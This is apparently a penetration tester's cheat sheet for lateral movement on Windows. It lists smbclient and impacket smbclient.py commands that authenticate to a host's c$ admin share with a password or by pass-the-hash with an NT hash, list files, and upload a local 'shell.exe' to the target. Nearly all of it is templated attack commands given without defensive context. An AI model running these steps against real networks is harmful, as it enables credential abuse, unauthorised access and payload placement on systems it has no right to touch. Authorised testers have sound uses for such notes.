# Unix Shell

Search Tag(s): #lateral-movement #impacket #windows

## 01 - Authenticate

### 1.1 - Samba Suite Utils

`$ smbclient -U "[<domain_name>/]<username>%<password>" //<IP>/c$`

- Pass the Hash

`$ smbclient -U "[<domain_name>/]<username>" --pw-nt-hash <nt_hash> //<IP>/c$`

### 1.1 - Impacket

`$ smbclient.py [<domain>/]<username>:<password>@<IP>`

- Pass the Hash

`$ smbclient.py -hashes :<nt_hash> [<domain>/]<username>@<IP>`

## 02 - List Files and Directories

### 2.1 - Samba Suite Utils

`smb: \> ls`

### 2.2 - Impacket

```
# use c$

# ls
```

## 03 - Copy Files

### 3.1 - Samba Suite Utils

`smb: \> put /path/to/local/shell.exe`

### 3.2 - Impacket

```
# put /path/to/local/shell.exe
```